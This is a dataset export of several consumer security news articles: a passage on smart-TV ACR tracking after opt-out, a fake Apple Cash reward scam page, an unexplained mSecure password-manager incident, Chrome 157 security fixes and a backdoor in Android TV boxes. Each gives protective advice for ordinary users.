Vizio continued to send 100% of what looked like traffic when viewing its first-party streaming services and antenna-based TV services, even after people had opted out, the study said. It also sent the same amount of traffic when idle. However it didn’t send any ACR traffic for third-party streaming data, according to the report.

Samsung did appear to leak some traffic from third-party streaming services after the researchers opted out of its ACR function. They tested 30 runs of Samsung’s built-in streaming service after opting out of ACR, and found that it still showed traffic “consistent with ACR”.

After opt-out, the Samsung TV’s Tizen OS seemed to send ACR-related traffic about Netflix in 7% of runs, YouTube in 10% of runs, and Tubi TV in 20%. It sent ACR 60% of the time from HDMI sessions. Like the Vizio TV, it also sent ACR traffic for all of its first-party streaming sessions.

Late last month, a researcher reverse-engineered a Samsung Smart TV and cast doubt on whether disabling ACR worked on the device.

There was good news, though. Four smart TV operating systems went completely silent after the researchers turned off ACR: LG’s WebOS, Sony’s Google TV OS, Amazon’s FireTV OS, and Supersonic’s VIDAA OS.

Vizio agreed to pay $2.2 million in a 2017 FTC settlement over charges that it collected viewing histories on eleven million smart TVs without user consent. At the time, it agreed to allow people to opt out of ACR.

The Vizio TV that the researchers tested sent traffic to Kinesis, an Amazon-run data ingestion service that the manufacturer uses to analyze data from its smart TVs. The researchers noticed no dip in traffic to this domain when they opted out of ACR on a Vizio TV. They said:

“The opt-out setting has no observable effect on traffic sent to this endpoint. However, we cannot inspect the payload due to encryption so we cannot confirm whether this violates the FTC settlement.”

That’s a challenge to this research because most smart TVs encrypt their ACR traffic, including Samsung. So the researchers had to infer that this was ACR traffic based on signals such as where it was being sent, along with timing, volume, and protocol details.

One exception was Supersonic’s VIDAA OS, which sent ACR data to servers unencrypted. The servers responded unencrypted with a genre for what they recognized. Anyone watching the network could see it all, they warned. And because the servers didn’t require a login at the time of the test, over 57 million ACR detection results from other people’s TVs were accessible.

Vizio’s first-party streaming service WatchFree+ also dropped unencrypted titles of any show or channel being watched into online communications with the free TV service provider. There’s no way to turn that off, the researchers warned.

Walmart acquired Vizio for $2.3 billion in 2024, partly to help “advertisers to meaningfully connect with customers at scale and boost product discovery”.

The retailer also runs Walmart Connect, a retail media business that uses its customers’ data to help other businesses target them with ads.

Walmart was particularly interested in Vizio’s advertising business it, said at the time:

“Pairing it with Walmart Connect will be impactful and allow us to invest in our business even further on behalf of our customers.”

What can you do to protect yourself from a smart TV that might be sending your viewing data elsewhere? The researchers have some suggestions:

WebOS (LG), Fire TV OS, Google TV on Sony, and VIDAA OS on Supersonic all appeared to honor ACR opt-out, so selecting it on these TVs should be safe.

Disconnect the TV from the internet and use an external streaming device. That way the TV can’t send back data, even if it picks it up from the HDMI connection.

Use a blocklist. This takes a little more technical knowledge. If you run an internet router that can accept blocklists, then you can add a list of known ACR endpoints that will stop your TV’s traffic reaching them. The researchers provide one here .

Stop threats before they can do any harm.

articles.title: The fake $750 Apple Cash reward that pays out nothing
articles.raw_content:
.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{padding-top:20px;padding-right:20px;padding-bottom:10px;padding-left:20px;}.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{flex-direction:column;}.kadence-column484244_4b5e59-45 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{background-color:rgba(255, 229, 229, 0.83);}.kadence-column484244_4b5e59-45 > .kt-inside-inner-col:before{opacity:0.3;}.kadence-column484244_4b5e59-45{position:relative;}@media all and (max-width: 1024px){.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column484244_4b5e59-45 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}} In this article A fake $750 Apple Cash offer funnels users toward app and game promotions Its device checks, countdown, and “spots left” claims aren’t real Users get no reward and may share information or spend money in games A page we found promises a $750 Apple Cash reward if you complete a quick “device verification.” There is no reward, and the page does not verify your device. Instead, it sends you to app offers through affiliate tracking links. The page is not affiliated with Apple. If you’ve landed on a page like this, close it. The fake page promises $750 in Apple Cash Why Apple makes such good bait Apple is one of the world’s most recognized brands, and scammers use that familiarity to make fake offers seem credible. Apple’s own scam guidance lists fake promotions offering free products and prizes among common tricks. Current Apple news gives scammers useful cover. The new iPhone Duo is in the headlines, and we recently found a fake preorder page whose code tried to exploit older iPhones as soon as the page opened. With the iPhone Duo starting at $1,999, a promise of $750 in Apple money may catch people’s attention. The word “verify” may also sound timely. Starting November 9, Green Dot Bank, which issues Apple Cash, will require some users to verify their identity before they can reload their balance. A fake page asking people to “verify your device” to get Apple Cash may seem more plausible in that context. Apple Cash isn’t an Apple Gift Card The page blurs two different things: Apple Cash is money you send, receive and spend through Apple Wallet. An Apple Gift Card adds money to your Apple Account balance for Apple purchases. Apple warns that its gift cards can only be used for Apple purchases, and that someone asking you to pay them with one is probably a scammer. But neither Apple Cash nor an Apple Gift Card comes from a website that “unlocks” it after you install an app. The fake site leans hard on Apple’s name. It calls the app it promotes an “Official Apple Partner” that is “Verified by Apple Cash,” and its footer claims “Copyright © 2026 Apple Inc.” None of that is true. A “verification” that verifies nothing We looked at the code behind the page’s three steps: Eligibility Check, Verify Device and Claim Reward. The eligibility check is a timer. The four items that tick green, including “Location: United States,” are just labels that light up on a schedule. The page never checks where you are or what device you use. Everyone passes in under four seconds. It tells users to download an app for “device verification” The device verification is an app install. The page tell users to download an app called Reco Social, then tells them to create an account, and install and play a game. We found no evidence that Reco Social or its developer created or operated the fake reward page. When you tap Download & Open App , the page opens a link in a new tab. Five seconds later, it starts showing “Verifying device…”. Nothing is being verified. The page has no way of knowing whether you installed anything, created an account or played a game. The reward is the same link again. Ten minutes after you tap the button, the page moves on by itself and announces “Device Verified Successfully,” whether or not you installed anything. The Claim Your $750 button doesn’t add anything to your wallet. It opens the same link as the download button. Fake urgency The page is built to stop you from thinking too long: “Only 47 spots left today” always starts at 47. It drops by one every 30 seconds and stops at 3, so it never runs out. The “claimed $750” pop-ups are generated at random from a list of 15 first names and 15 US states, with a random “minutes ago.” Every visitor sees a new one every 8 to 15 seconds. The 10-minute “Session Expires” countdown doesn’t end anything when it hits zero. Who gets paid? The download button doesn’t go directly to the App Store. It first goes through a tracking link on taprkr[.]com. These links can be used in affiliate marketing to credit clicks and installs to whoever sent the traffic. The link carries a label, “recosocial-cpr.” CPR can stand for “cost per registration,” a deal where a promoter earns money when someone signs up. That label alone doesn’t confirm how this offer pays. The destination varied in our tests. The link led to an offer labeled “playful-rewards-revshare” on iPhone and an ad network on PC. A revshare (revenue share) deal usually pays the promoter a cut of what users later spend, such as on in-app purchases. The tracking labels suggest that promoters may earn money from registrations or spending in promoted apps, but they don’t confirm how this offer pays. Users don’t receive the promised $750. We have no evidence that Reco Social or any app at the end of these links is behind the fake Apple page. Deceptive affiliate promoters can send traffic to legitimate apps because they may earn money for installs or signups regardless of how users were persuaded. The page also loads a TikTok tracking pixel, which advertisers use to measure campaigns. This could mean the operators are measuring traffic from TikTok, but it doesn’t show where the link was shared. What’s the harm if it’s “just” an app install? Compared to a page that steals passwords or card numbers, this one can look harmless. But you still pay a price: You give away personal data. Creating an account means handing over your email address, phone number or social login to a service you only signed up for because of a lie. You may be encouraged to spend. Many mobile games make their money from in-app purchases, and with a revenue-share deal, someone profits when you spend. You may be set up for the next scam. Fake reward offers often come in chains. The next one may ask for your Apple Account details, card number, or a “small processing fee.” You lose time chasing a reward that was never coming. How to stay safe Keep these points in mind if you come across an Apple Cash or other Apple-related offer online: Don’t expect an app install to pay you in Apple Cash. Be suspicious of any “Apple” offer that asks you to download a third-party app, create an account or play a game to receive Apple Cash or an Apple Gift Card. Verify Apple Cash only in Settings. The real identity check is in Settings > Wallet & Apple Pay > Apple Cash . Treat any website or message that asks you to “verify” Apple Cash somewhere else as suspicious. Be extra careful around launches and holidays. iPhone Duo deals, giveaways and preorder offers will keep circulating. Go to apple.com or the Apple Store app yourself instead of following links. Check the address bar. Apple’s website is apple.com. A page on a domain like applecashgiftcard[.]com is not Apple, however much it looks like it. Treat countdowns and “spots left” as red flags. Fake urgency is there to rush you past the moment you’d ask, “Why would anyone give me $750 for this?” Already installed an app from a page like this? You didn’t earn a reward, so you can delete the app. Delete any account you created through it, cancel any subscriptions in your App Store settings, and change that password on any other accounts where you reused it. Never pay with gift cards, and never pay to receive a prize. As the FTC puts it, “No real business or government agency will ever tell you to buy a gift card to pay them.” If a “reward” asks for a fee, your card details or gift card codes, it’s a scam. Report it. Apple asks people to forward suspicious Apple-themed messages to reportphishing@apple.com. You can also report the ad or post to the platform where you saw it and, in the US, report fraud at ReportFraud.ftc.gov . How Malwarebytes helps Malwarebytes can help block known scam pages. Use Browser Guard with a supported browser, or Web Protection in Malwarebytes for iOS when browsing with Safari. If you’re not sure whether a link, text or offer is real, you can ask Malwarebytes Scam Guard before you click. “One of the best cybersecurity suites on the planet.” According to CNET. Read their review →

articles.title: mSecure tells users to change passwords but won’t say why [updated]
articles.raw_content:
Password manager mSecure has warned current and former customers to protect the confidential information stored in its app after detecting “suspicious activity.”

But its advice about what users should do comes without an explanation of what happened or whose information might be at risk.

The warning leaves users to decide whether to replace credentials—and whether it’s safe to store replacements in mSecure.

While those are perfectly reasonable questions, mSecure’s warning does not answer them.

In an email published by The Hacker News and sent to customers on November 3, mSecure’s developer, mSeven Software, said:

“mSeven Software (‘mSeven’) recently learned of suspicious activity associated with the mSecure password management application. In response, mSeven quickly launched an investigation, took steps to mitigate the issue, and engaged external cybersecurity experts to assist.”

The notice recommends that customers “immediately take steps to protect all confidential information” stored in mSecure. Those steps:

“may include changing passwords, resetting or re-enrolling two-factor authentication methods, or removing existing passkeys.”

But the notice does not identify the suspicious activity, when it occurred, which systems were involved, or whether anyone accessed customers’ stored information . The Register , which also reviewed the email, noted that the company had not explained whether customers’ secrets were exposed.

Because the scope of the incident is unknown, we recommend prioritizing your most important accounts while mSeven investigates.

Changing your mSecure password alone may not be enough if someone has already accessed your account. mSecure’s documentation explicitly warns that someone may already have made a backup of its contents. That guidance does not establish what happened in this incident.

Users should not have to wait for a completed forensic investigation before receiving useful guidance. They need to know who should act, which credentials need attention, and whether the tool they would normally use to manage those changes remains safe to use.

Until mSeven provides those answers, our advice is to prioritize your most important accounts, replace the relevant credentials through official services, and avoid destructive account resets:

Change passwords through each service’s official website or app, beginning with your primary email, financial accounts, work accounts, and accounts used to recover access to other services. Use a new, different, strong password for each.

Review two-factor authentication stored in the vault. If that could be compromised by unauthorized access, consider re-enrolling that account’s authenticator through the service’s security settings.

For passkeys stored in mSecure, use each website or app’s account-security settings to remove the old registration and create a replacement with a different provider as a precaution. But make sure another working sign-in method is available first.

Think carefully about where replacement credentials go. The notice does not establish whether saving new credentials in mSecure is safe. For users rotating important accounts now, using a different password manager temporarily is a reasonable precaution.

We’ll keep you posted if we learn more about this incident, so stay tuned.

According to follow-up messages attributed to mSecure support and reproduced by multiple customers on the company’s forum , the incident affects only users who synchronized with mSecure Cloud. We have not located a directly published company statement confirming that scope.

Let’s face it, an incognito window can only do so much. Breaches, dark web trading, credit fraud. Malwarebytes Identity Theft Protection monitors for all of it, alerts you fast, and comes with identity theft insurance.

articles.title: Chrome 157 fixes 213 security issues, including 7 critical flaws
articles.raw_content:
On November 3, Google issued Chrome 157 to the stable channel for Windows, Mac and Linux. The update is rolling out over the coming days and weeks. Most users are on Chrome’s Stable channel. The desktop update brings Chrome to versions 157.0.8103.38/.39 for Windows and Mac and 157.0.8103.38 for Linux . It includes 213 security fixes, including seven vulnerabilities rated Critical by Google. Chrome for Android was also updated to 157.0.8103.38 . It will become available on Google Play over the coming days. How to update Chrome The easiest option is to allow Chrome to update automatically. But you can end up lagging behind on updates if you never close your browser or if something goes wrong, such as an extension preventing the update. If you don’t want to wait for the rollout to reach you, you can update manually. Open About Google Chrome from Chrome’s settings or Help menu. Chrome will check for updates. If one is available, click Relaunch to apply it. Chrome 157.0.8103.39 is up to date You can find an explanation of the version numbering system and step-by-step instructions in our guide: How to update Chrome on every operating system . Technical details Some of the security fixes deserve a closer look. Google rates seven vulnerabilities in the update as Critical. One, a memory corruption flaw in ANGLE, affects Chrome for Android. It could potentially allow a remote attacker to run code outside the sandbox through a specially crafted HTML page. articles.title: A hidden backdoor put 1.3 million set-top boxes to work for criminals
articles.raw_content:
.kadence-column484175_1ef361-88 > .kt-inside-inner-col{padding-top:20px;padding-right:20px;padding-bottom:10px;padding-left:20px;}.kadence-column484175_1ef361-88 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column484175_1ef361-88 > .kt-inside-inner-col{flex-direction:column;}.kadence-column484175_1ef361-88 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column484175_1ef361-88 > .kt-inside-inner-col{background-color:rgba(255, 229, 229, 0.83);}.kadence-column484175_1ef361-88 > .kt-inside-inner-col:before{opacity:0.3;}.kadence-column484175_1ef361-88{position:relative;}@media all and (max-width: 1024px){.kadence-column484175_1ef361-88 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column484175_1ef361-88 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}} In this article Google says Videostrong backdoored 1.3 million certified Android TV boxes and sold criminals access to the botnet. The takedown disrupted the botnet, but the backdoor remains in infected boxes’ firmware. Suspect your box? Disconnect it and ask the seller about a fix or replacement. Most malware needs you to click something. This one came in the box. Google’s Threat Intelligence Group (GTIG) says it has high confidence that Android device maker Videostrong Technology built and ran the XCPE backdoor for financial gain. Videostrong sold access to criminal affiliates, who loaded their own malware modules onto the boxes. GTIG found that the backdoor, called x.cpe (or com.oemservice in some builds), sits in the firmware with system-level privileges. If someone uninstalls it, it reinstalls itself from the /oem/ partition when the device reboots. It could also switch off Google Play Protect app verification, allowing it to install more software without asking. Google says Videostrong got past its compatibility and security tests by loading the malicious code after the device’s first boot. This allowed the devices to remain part of the residential proxy network. Residential proxy networks rent out ordinary home IP addresses to customers. That makes their traffic appear to come from a legitimate consumer connection rather than a data center. This can help cybercriminals evade IP-based fraud controls and reputation systems. The problem for users Here’s what the backdoored set-top boxes could mean for their owners: Your home internet connection could be used by others. Residential proxy modules routed other people’s traffic through infected boxes and their owners’ home IP addresses. Ad fraud . Modules generated fake ad views and clicks in the background. Spying and remote access to your device. Google observed operators capturing live screenshots, injecting keystrokes, collecting account and device information, and opening reverse shells. More malware. Some affiliate modules were backdoors that could load further modules. Your IP address could be linked to activity you didn’t start. Proxy traffic can include attempts to guess account passwords, for example, and may make your home IP address appear in connection with that activity. How to stay safe Google and its partners took legal action to take down the domains and servers Videostrong used to control the botnet. Google says it has banned Videostrong and its future subsidiaries and affiliates from making certified Android devices, and strengthened firmware integrity checks for certified Android TV devices. The takedown only cuts the current connection to the malicious servers. It doesn’t remove the backdoor from infected devices, and can potentially be exploited by other criminals. If you think your box may be affected, disconnect it and contact the seller or manufacturer to ask for clean firmware or a replacement. Uninstalling the app won’t remove the backdoor from the firmware. Google hasn’t published a complete list of affected models, so owners may not be able to tell from the model name alone whether their box is infected. If you decide to replace your box: Buy from a reputable manufacturer. Be cautious about “free TV” boxes. We’ve previously reported on Superbox and similar devices. Be cautious about apps that pay you to share your bandwidth. They can route other people’s traffic through your internet connection. Stick to trusted app stores and keep Google Play Protect switched on. Isolate the box . Put TV boxes and other IoT gear on a separate network or VLAN with restricted outbound access. This doesn’t keep the devices themselves safe, but it does keep other devices separate. Scammers know more about you than you think.
